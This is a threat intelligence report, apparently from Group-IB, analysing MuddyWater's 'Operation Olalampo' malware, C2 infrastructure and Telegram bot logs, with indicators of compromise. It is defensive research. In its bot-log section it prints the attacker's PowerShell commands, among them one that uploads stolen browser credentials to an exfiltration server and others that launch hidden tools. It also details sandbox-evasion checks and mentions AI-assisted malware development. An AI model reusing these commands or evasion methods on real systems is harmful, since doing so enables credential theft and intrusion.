# Operation Olalampo: Inside MuddyWater's Latest Campaign

> **Published:** February 20, 2026  
> **Source:** Group-IB Threat Intelligence  
> **Tags:** Advanced Persistent Threats, Malware, Middle East, MuddyWater, Nation State, Olalampo, Threat Intelligence

---

## Table of Contents

1. [Introduction](#introduction)
2. [Key Discoveries](#key-discoveries)
3. [MuddyWater Overview](#muddywater-overview)
4. [Technical Analysis](#technical-analysis)
   - [Microsoft Office Documents](#microsoft-office-documents)
   - [Dropped Payloads](#dropped-payloads)
5. [Malware Analysis](#malware-analysis)
   - [GhostFetch (Downloader)](#ghostfetch-downloader)
   - [GhostBackDoor](#ghostbackdoor)
   - [HTTP_VIP (Downloader)](#http_vip-downloader)
   - [CHAR (Rust Backdoor)](#char-rust-backdoor)
6. [Infrastructure Analysis](#infrastructure-analysis)
   - [GhostFetch C2](#ghostfetch-c2-infrastructure)
   - [HTTP_VIP C2](#http_vip-c2-infrastructure)
   - [Server-Side C2 Analysis](#server-side-c2-analysis)
7. [Telegram C2 Bot Analysis](#telegram-c2-bot-analysis)
   - [Observed Commands](#observed-command-execution)
   - [Executed Commands Timeline](#list-of-executed-commands)
8. [Threat Actor Artifacts](#potential-threat-actor-information)
9. [Attribution Assessment](#attribution-assessment)
10. [Recommendations](#recommendations)
11. [Indicators of Compromise](#indicators-of-compromise)

---

## Introduction

The Group-IB Threat Intelligence Team identified a new cyber campaign attributed with **high confidence** to the Iranian threat actor known as **MuddyWater**. This campaign, dubbed **Operation Olalampo**, targeted multiple organizations and individuals primarily across the MENA region, aligning with ongoing geopolitical tensions.

First observed on **26 January 2026**, the operation involved the deployment of several novel malware variants exhibiting tactical and technical overlap with samples previously attributed to MuddyWater. Notably, one variant leveraged a **Telegram bot** as a command-and-control (C2) channel.

Monitoring of this Telegram C2 bot revealed valuable insight into MuddyWater's post-exploitation activity, including executed commands, deployed tools, and data collection techniques. The bot's activity also exposed limited historical usage in late 2025, indicating **infrastructure reuse** rather than a separate campaign, while the core tradecraft remains consistent with MuddyWater's known operations.

---

## Key Discoveries

- A targeted campaign primarily impacting organizations in the **MENA region**
- Discovery of **four new malware variants**:
  - **CHAR** — A Rust backdoor
  - **GhostFetch** — A first-stage downloader
  - **HTTP_VIP** — A downloader/backdoor
  - **GhostBackDoor** — An advanced backdoor
- Indicators suggesting **AI-assisted malware development**
- Use of **Telegram bot as a C2 channel**, exposing post-exploitation activity
- Discovery of the **HTTP_VIP custom Python C2 server** source code along with infected victims
- Infrastructure overlap linking the campaign to **historical MuddyWater operations dating back to October 2025**

---

## MuddyWater Overview

MuddyWater is a well-known Iranian-linked threat actor active for several years, primarily targeting **government, telecommunications, energy, and critical infrastructure** sectors across the Middle East and beyond. The group is known for its use of spear-phishing campaigns, custom malware, and consistent post-exploitation tradecraft.

---

## Technical Analysis

The campaign involved multiple attacks against organizations and individuals primarily across the MENA region starting around **26 January 2026**, in alignment with the current geopolitical escalation in the region.

These attacks follow similar patterns and align with killchains previously observed in MuddyWater attacks: starting with a **phishing email** with a Microsoft Office document attachment containing malicious macro code that decodes the embedded payload, drops it on the system, and executes it, providing the adversary with remote control. Although delivery methods across various attacks had similarities, multiple final payloads were observed including **HTTP_VIP**, **GhostBackDoor**, and **CHAR**. Furthermore, the analysis showed that in addition to phishing, MuddyWater actively sought to exploit recently disclosed vulnerabilities on public-facing servers.

### Microsoft Office Documents

MuddyWater relied on various malicious Microsoft Office documents for malware delivery, tailored for distinct targets. Multiple document variants were observed, all following the same macro-based execution logic with minor implementation differences.

#### Variant #1: Excel Document — CHAR Backdoor Delivery

- **Theme:** Mimics an energy and marine services company in the Middle East
- **Targets:** Contractors associated with the organization, or the organization itself
- **Final Payload:** CHAR Rust backdoor

**Macro Functionality:**
1. Execution begins with `Workbook_Open` event (auto-triggers when macros are enabled)
2. Decodes the payload
3. Drops to `C:\Users\Public\Downloads\novaservice.exe`
4. Payload connects to Telegram bot C2

#### Variant #2: Excel Document — GhostBackDoor Delivery

- **Theme:** Same energy and marine services company
- **Targets:** Contractors or the target company
- **Final Payload:** GhostFetch → GhostBackDoor

**Macro Functionality:**
1. `Workbook_Open()` auto-executes
2. `wait()` function with nested loop to **evade sandbox sleep hooks**
3. Retrieves decimal-encoded string from hidden UI element (`UserForm1.TextBox1.Text`)
4. Decodes and drops to `C:\Users\Public\Documents\MicrosoftExcelUser.exe`
5. Executes GhostFetch, which then deploys GhostBackDoor

#### Variant #3: Word Document — HTTP_VIP + AnyDesk Delivery

- **Theme:** Flight tickets and reports
- **Targets:** Individuals of interest and system integrator companies in the Middle East
- **Final Payload:** HTTP_VIP → AnyDesk RMM

**Macro Functionality:**
1. `Workbook_Open()` auto-executes
2. Nested-loop sleep evasion via `wait()`
3. Retrieves string from `UserForm1.TextBox1.Text`
4. Drops to `C:\Users\<username>\Downloads\pic.LOG` or `C:\Users\Public\Documents\MicrosoftWordUser.exe`
5. HTTP_VIP downloads and deploys AnyDesk

### Dropped Payloads

The malicious document variants drop three distinct malware types:

| Payload | Type | Delivery |
|---------|------|----------|
| GhostFetch | Downloader | Variant #2 → downloads GhostBackDoor |
| HTTP_VIP | Downloader | Variant #3 → downloads AnyDesk |
| CHAR | Backdoor (Rust) | Variant #1 → Telegram C2 |

---

## Malware Analysis

### GhostFetch (Downloader)

A first-stage downloader designed to fetch and execute secondary payloads directly in memory.

**Startup Behavior:**
- If command-line argument `static` is passed, starts `explorer.exe shell:RecycleBinFolder`

**Anti-Analysis & Evasion:**

The malware terminates immediately if it detects:

| Check | Threshold |
|-------|-----------|
| RAM | < 2 GB |
| CPU Cores | < 2 |
| USB Devices | < 2 previously connected |
| User Activity | Validates mouse movements, checks screen resolution |
| Analysis Tools | Scans for debuggers, VM artifacts, AV software |
| Execution Timing | `GetTickCount64` to detect stepping |

**Persistence & Delivery:**

| Mechanism | Detail |
|-----------|--------|
| Path | `%LOCALAPPDATA%\microsoft\windows\burnutill\burn.exe` (hash modified on copy) |
| Registry | `User Shell Folders\Startup` |
| C2 | Decodes hardcoded C2 list (primary: `promoverse[.]org`) |
| Payload | Downloads AES-encrypted PE, reflectively loads into memory |

The malware attempts to re-execute itself multiple times after fetching second-stage payloads, generating significant system noise that could trigger security alerts.

---

### GhostBackDoor

Sophisticated backdoor deployed by GhostFetch. Adapts installation based on environment privileges:

| Privilege Level | Installation Method |
|----------------|-------------------|
| Admin | Service: `MicrosoftVersionUpdater` |
| Security Tools Present | Windows Recycle Bin ClassID (`{645FF040-5081-101B-9F08-00AA002F954E}`) |
| Standard User | Startup registry folder |

**C2 Communication:**

All communications are **AES-encrypted** using **French-named API endpoints**. The malware fragments operations across separate commands to evade network detection.

| Cmd ID | Action | API Endpoints |
|--------|--------|---------------|
| 1 | Ping / Heartbeat | `/api/accueil/actualiser` |
| 3, 4, 5, 6 | Interactive Shell (start CMD, write, read, close) | `/api/graphique/obtenir-donnees`, `/api/graphique/consulter`, `/api/accueil/televerser` |
| 7, 8 | File Write | `/api/utilisateurs/enregistrer`, `/api/accueil/filtrer` |
| 9, 0xA | File Read | `/api/accueil/rechercher` |
| 0xB | Disable sleep between connections | — |
| 0xC | Re-run GhostFetch | Triggers `burn.exe` for additional payloads |
| 0x12, 0x16, 0x17, 0x18 | Process Stream Management | `/api/authentification/renouveler_token`, `/api/accueil/televerser` |

The fragmented command structure (separate commands to spawn shell vs. interact with it) is designed to **evade network detection engines** and cause incomplete or delayed alerting.

---

### HTTP_VIP (Downloader)

A native downloader that bridges initial access to further exploitation:

1. **System Reconnaissance:** Harvests local username and computer name
2. **Domain Guardrail:** Checks for a hardcoded healthcare provider domain; terminates if matched (identified as a honeypot the actor intentionally excluded)
3. **C2 Authentication:** Connects to `codefusiontech[.]org`
4. **Payload Deployment:** Retrieves and executes AnyDesk RMM tool

**C2 API Endpoints:**

| Endpoint | Function |
|----------|----------|
| `/postinfo` | Agent registration (sends hostname, username, domain, Windows version, AV name) |
| `/content` | Heartbeat — checks for pending commands (`list`, `select`, `upload`, `exit`, `delete`) |
| `/upload-results` | Download AnyDesk binary in chunks via `X-ChunkId` header |
| `/ercv` | Confirms all chunks received |

**Hash Evasion:** The server creates unique AnyDesk binaries per agent (`AnyDesk<agent_id>.exe`) by appending random bytes, randomizing the hash without altering functionality.

#### New HTTP_VIP Variant (Standalone Backdoor)

A second variant operates as a standalone backdoor rather than a downloader:

| Cmd ID | Function | Output Endpoint |
|--------|----------|----------------|
| 201 | Interactive shell | `/ecmd` |
| 202 | Upload file | `/esend` |
| 203 | Download file | `/erecv` |
| 210 | Capture clipboard | — |
| 222 | Update sleep/beacon interval | — |

---

### CHAR (Rust Backdoor)

A tactical shift for MuddyWater: a Rust-based backdoor controlled via Telegram bot.

**Supported Commands:**
- `CMD` — Execute CMD command
- `PowerShell` — Execute PowerShell command
- `Change directory` — Navigate filesystem

**AI-Assisted Development Evidence:**

Analysis reveals command handlers containing **emoji debug strings** — a trait rarely seen in human-authored code. Four instances were identified, suggesting the adversary used an AI model (consistent with Google TI reports on MuddyWater using Gemini) to generate code segments and failed to sanitize debug strings before compilation.

---

## Infrastructure Analysis

### GhostFetch C2 Infrastructure

| Field | Value |
|-------|-------|
| Domain | `promoverse[.]org` |
| Real IP | `209[.]74[.]87[.]67` (behind CloudFlare) |
| Registration | 2025-12-21 |
| Certificate | 2026-01-07 → 2026-04-07 |
| Decoy Site | ~2026-01-15 → ~2026-01-25 |
| C2 Active | ~2026-01-27 → ~2026-01-30 |

Direct link identified to prior MuddyWater infrastructure: `netvigil[.]org` hosted identical HTML content and was used in earlier campaigns alongside GhostFetch/GhostBackDoor in **October 2025**.

The decoy site "Promoverse – Digital Marketing & Brand Promotion" runs on `Werkzeug/3.1.5 Python/3.12.3` and is **highly likely AI-generated**: a single non-functional HTML page with dead buttons and empty social media links.

### HTTP_VIP C2 Infrastructure

#### miniquest[.]org

| Field | Value |
|-------|-------|
| Registrar | NameCheap |
| Registration | 2026-01-27T12:44:23Z |
| Real IP | `159[.]198[.]43[.]141` (behind CloudFlare) |
| Certificate | 2026-02-01 → 2026-05-02 |
| C2 Active | 2026-02-02 → 2026-02-13 |
| Backend | Werkzeug/3.1.5 Python/3.12.3 |

#### codefusiontech[.]org

| Field | Value |
|-------|-------|
| Registrar | NameCheap |
| Registration | 2026-02-02T06:24:36.42Z |
| Real IP | `209[.]74[.]87[.]100` (behind CloudFlare) |
| Certificate | 2026-02-09 → 2026-05-10 |
| C2 Active | 2026-02-11 → 2026-02-15 |
| Backend | Werkzeug/3.1.5 Python/3.12.3 |

An **open directory** on `209[.]74[.]87[.]100` exposed `FMAPP.exe` / `FMAPP.dll` (previously observed in MuddyWater open directories), served via Python SimpleHTTP server (`SimpleHTTP/0.6 Python/3.12.3`).

### Server-Side C2 Analysis

The HTTP_VIP C2 source code was obtained. It is a **Flask-based Python** web application managing HTTP_VIP connections with an SQLite database of compromised hosts.

**Server components found:**
- HTTP_VIP Flask C2 server
- AnyDesk binaries (legitimate, used for RMM)
- `FMAPP.dll` — Malicious injector deploying SOCKS5 reverse proxy

**C2 Deployment Architecture:**

```
[Internet] → [Apache :80/:443] → mod_proxy → [Python Flask :8080 (127.0.0.1)]
                  ↓
         TLS termination + reverse proxy
         Decoy site when Flask is stopped (503)
```

1. Apache on ports 80/443, serving decoy website or no content
2. Python C2 backend on port 8080 (bound to 127.0.0.1)
3. UFW blocks port 8080 externally
4. Apache `mod_proxy` forwards requests to Flask backend
5. When Flask stops → Apache returns 503

**Persian Keyboard Artifact:**

The command history contains `فئعط` — the word `tmux` typed on a **Persian keyboard layout**, further strengthening attribution to an Iranian operator.

---

## Telegram C2 Bot Analysis

The Telegram bot used by CHAR provided direct visibility into MuddyWater's operations.

| Field | Value |
|-------|-------|
| Display Name | Olalampo |
| Username | `stager_51_bot` |

### Bot Command Structure

**Period 2 (2026-01-28 → 2026-02-01):**

| Command | Function |
|---------|----------|
| `/start` | CHK |
| `/cmd` | CMD |
| `/shell` | POWER |
| `/cd` | CD |

**Period 1 (2025-10-06 → 2025-10-12):**

| Command | Function |
|---------|----------|
| `/start` | ACK and HELP |
| `/prompt` | Execute command |
| `/cd` | Change directory |

### Observed Command Execution

#### Command #1 — FMAPP.exe Execution
**Observed:** 2025-10-12 08:46:28 and 2025-10-06 12:47:41

Executes `FMAPP.exe` to sideload `FMAPP.dll` (reverse SOCKS5 proxy or Kalim backdoor):

```powershell
vacrosysi;$vacrosysi="vacrosysi";Start-Process c:\ProgramData\FMAPP.exe -WindowStyle Hidden
```

#### Command #2 — Credential Exfiltration
**Observed:** 2025-10-06 12:40:18

Uploads `cobe-notes.txt` (MuddyWater's custom browser infostealer output) to C2:

```powershell
$wc = New-Object System.Net.WebClient
$resp = $wc.UploadFile("hxxp://143[.]198[.]5[.]41:443/success","c:\users\public\downloads\cobe-notes.txt")
```

#### Command #3 — Unknown Binary Execution
**Observed:** 2025-10-06 12:35:21

```powershell
wknlha;$wknlha="wknlha";Start-Process c:\ProgramData\sh.exe -WindowStyle Hidden
```

#### Command #4 — gshdoc Execution
**Observed:** 2025-10-06 11:47:03

```powershell
fdhbqyr;$fdhbqyr="fdhbqyr";Start-Process c:\ProgramData\gshdoc_release_X64_GUI.exe -WindowStyle Hidden
```

### List of Executed Commands

Reconnaissance and post-exploitation activity timeline:

| Timestamp (UTC) | Command | Category |
|-----------------|---------|----------|
| 2026-02-01 13:50:35 | `whoami` | Recon |
| 2026-02-01 12:14:33 | `dir` (unknown cmd) | Recon |
| 2026-02-01 12:13:55 | `whoami` | Recon |
| 2026-02-01 10:53:22 | `whoami` | Recon |
| 2026-01-31 17:52:27 | `whoami` | Recon |
| 2026-01-31 17:30:06 | `whoami` | Recon |
| 2026-01-31 16:35:43 | `whoami` | Recon |
| 2026-01-30 23:15:10 | `whoami` | Recon |
| 2026-01-30 19:09:38 | `dir ..\desktop` | Recon |
| 2026-01-30 19:08:50 | `dir` | Recon |
| 2026-01-30 19:08:09 | `nslookup ad` | AD Discovery |
| 2026-01-30 19:08:06 | `ipconfig /all` | Network Recon |
| 2026-01-30 19:08:04 | `whoami` | Recon |
| 2026-01-28 17:53:20 | `whoami` | Recon |
| 2026-01-28 17:13:12 | `taskkill /IM novaservice.exe` | Process Mgmt |
| 2026-01-28 16:05:05 | `whoami` | Recon |
| 2026-01-28 16:04:15 | `schtasks /create /sc daily /st 09:00 /tn "DailyUpdate" /tr "C:\Users\Public\Downloads\novaservice.exe"` | Persistence |
| 2026-01-28 15:54:06 | `whoami` | Recon |
| 2026-01-28 15:22:35 | `whoami /all` | Privilege Enum |
| 2026-01-28 15:18:04 | `whoami /all` | Privilege Enum |
| 2026-01-28 15:17:46 | `whoami` | Recon |
| 2026-01-28 15:05:37 | `whoami` | Recon |
| 2026-01-28 14:47:46 | `whoami` | Recon |
| 2026-01-28 12:42:10 | `whoami` | Recon (TA test) |
| 2025-10-12 09:19:00 | `ping -n 2 -a <target>` | Network Scan |
| 2025-10-12 08:47:54 | `ipconfig` | Network Recon |
| 2025-10-12 08:46:28 | PowerShell encoded (FMAPP.exe) | Tool Deploy |
| 2025-10-12 08:39:00 | `nslookup ad` | AD Discovery |
| 2025-10-07 16:23:02 | `ipconfig /all` | Network Recon |
| 2025-10-07 16:12:13 | `ipconfig /all` | Network Recon |
| 2025-10-06 14:38:30 | `ping -n 2 -a <target>` | Network Scan |
| 2025-10-06 12:56:44 | `ping -n 2 -a <target>` | Network Scan |
| 2025-10-06 12:54:06 | `ipconfig /all` | Network Recon |
| 2025-10-06 12:49:28 | `net group "domain admins" /do` | AD Enum |
| 2025-10-06 12:47:41 | PowerShell encoded (FMAPP.exe) | Tool Deploy |
| 2025-10-06 12:47:22 | File downloaded: `FMAPP.dll` | Ingress Tool |
| 2025-10-06 12:47:09 | File downloaded: `FMAPP.exe` | Ingress Tool |
| 2025-10-06 12:41:06 | `dir` | Recon |
| 2025-10-06 12:40:18 | PowerShell encoded (cobe-notes upload) | Exfiltration |
| 2025-10-06 12:39:43 | `dir c:\users\public\downloads` | Recon |
| 2025-10-06 12:36:47 | `net user /do` (repeated 7x) | AD Enum |
| 2025-10-06 12:36:25 | `dir` | Recon |
| 2025-10-06 12:35:41 | `whoami` | Recon |
| 2025-10-06 12:35:21 | PowerShell encoded (sh.exe) | Tool Deploy |
| 2025-10-06 12:34:58 | `dir` | Recon |
| 2025-10-06 12:34:46 | File downloaded: `sh.exe` | Ingress Tool |
| 2025-10-06 12:34:29 | File downloaded: `dllapp.dll` | Ingress Tool |
| 2025-10-06 12:34:10 | `cd` | Navigation |
| 2025-10-06 11:47:03 | PowerShell encoded (gshdoc_release) | Tool Deploy |
| 2025-10-06 11:46:26 | `cd` | Navigation |
| 2025-10-06 11:45:42 | `gshdoc_release_X64_GUI.exe gshdoc.exe` | Direct Exec |
| 2025-10-06 11:32:14 | `dir` | Recon |
| 2025-10-06 11:31:58 | File downloaded: `gshdoc_release_X64_GUI.exe` | Ingress Tool |
| 2025-10-06 11:31:33 | Directory changed to `c:\programdata` | Navigation |
| 2025-10-06 11:30:46 | Download failed: Access denied (os error 5) | Failed Op |
| 2025-10-06 10:57:00 | `ping -n 2 -a <target>` | Network Scan |
| 2025-10-06 10:56:44 | `ipconfig /all` | Network Recon |

---

## Potential Threat Actor Information

The threat actor tested the CHAR backdoor on their own machine before the January 2026 operation. Evidence from Telegram bot logs:

**Test Machine 1 — User `DontAsk`:**

| Field | Value |
|-------|-------|
| Date | 2026-01-28 15:22:35 |
| CWD | `C:\Users\DontAsk\Documents` |
| Command | `whoami /all` |
| Hostname | `desktop-9524r2b` |
| SID | `S-1-5-21-644383349-457702852-3382530326-1001` |
| Privilege | Standard local user, no domain membership |

`DontAsk` also appeared as "author" and "last modified by" in malicious Office documents.

**Test Machine 2 — User `Jacob`:**

| Field | Value |
|-------|-------|
| Date | 2026-01-28 12:42:10 |
| CWD | `C:\Users\Jacob\Documents\Char\target\x86_64-pc-windows-msvc\release` |
| Command | `whoami` |
| Output | `ultra\jacob` |
| Domain | `ultra` |

The CWD corresponds to the **Rust release build path** for the CHAR backdoor. Strings in the CHAR binary reference `Jacob` in Rust library paths — the same paths were observed in **BlackBeard** malware attributed to MuddyWater.

---

## Attribution Assessment

**Confidence: HIGH**

| # | Evidence |
|---|----------|
| 1 | `FMAPP.dll` (SHA1: `62ED16701A14CE26314F2436D9532FE606C15407`) matches reverse SOCKS5 reported in prior MuddyWater analysis |
| 2 | Malicious macro logic matches known MuddyWater patterns: `UserForm1.TextBox1.Text` decoding, nested-loop sleep evasion, `.log` file drops |
| 3 | GhostFetch/GhostBackDoor string decoding identical to other MuddyWater-linked malware |
| 4 | CHAR shares dev environment with BlackBeard (Archer RAT): same user `Jacob`, same Rust library paths |
| 5 | Post-exploitation TTPs match MuddyWater's known operational patterns |
| 6 | Infrastructure overlap: `netvigil[.]org` (prior MuddyWater C2) hosted identical HTML to `promoverse[.]org` |

---

## Recommendations

### Threat Intelligence & Monitoring
- Conduct continuous threat hunting for GhostFetch, CHAR, and related infrastructure indicators
- Integrate YARA rules and EDR detections for known MuddyWater malware families
- Subscribe to threat intelligence feeds for up-to-date IOCs and TTPs

### Email & Phishing Defenses
- Disable Office macros by default through Group Policy
- Deploy advanced attachment sandboxing with user interaction simulation (GhostFetch validates mouse movement)
- Regular phishing simulations emphasizing "enable content" lures

### Endpoint & Access Controls
- Restrict and monitor RMM tools (AnyDesk) usage
- Tune EDR for reflective code loading and in-memory execution detection
- Monitor service creation (`MicrosoftVersionUpdater`) and `User Shell Folders\Startup` registry modifications

### Network & Infrastructure Security
- Monitor/restrict outbound Telegram Bot API traffic
- Block known malicious domains and monitor for beaconing behavior
- Behavioral analysis for SOCKS5 reverse proxy activity (`FMAPP.dll`)

### Strategic Defense
- Sandbox environments: minimum 2 GB RAM, 2 CPU cores (prevents GhostFetch sandbox detection)
- Enforce least-privilege access controls
- Monitor `%LOCALAPPDATA%\Microsoft\Windows\BurnUtill\` path

---

## Indicators of Compromise

See [iocs.csv](iocs.csv) for the complete machine-readable IOC list.

### Domains

| Domain | Usage |
|--------|-------|
| `codefusiontech[.]org` | HTTP_VIP C2 |
| `promoverse[.]org` | GhostFetch C2 |
| `miniquest[.]org` | HTTP_VIP C2 |
| `jerusalemsolutions[.]com` | Related infrastructure |
| `netvigil[.]org` | Prior MuddyWater C2 (Oct 2025) |

### IP Addresses

| IP | Usage |
|----|-------|
| `162[.]0[.]230[.]185` | Infrastructure |
| `209[.]74[.]87[.]100` | HTTP_VIP C2 real IP |
| `143[.]198[.]5[.]41` | Data exfiltration server |
| `209[.]74[.]87[.]67` | GhostFetch C2 real IP |
| `159[.]198[.]43[.]141` | miniquest[.]org real IP |

---

*DISCLAIMER: All technical information is shared solely for defensive cybersecurity and research purposes. Group-IB does not endorse unauthorized or offensive use of this information.*
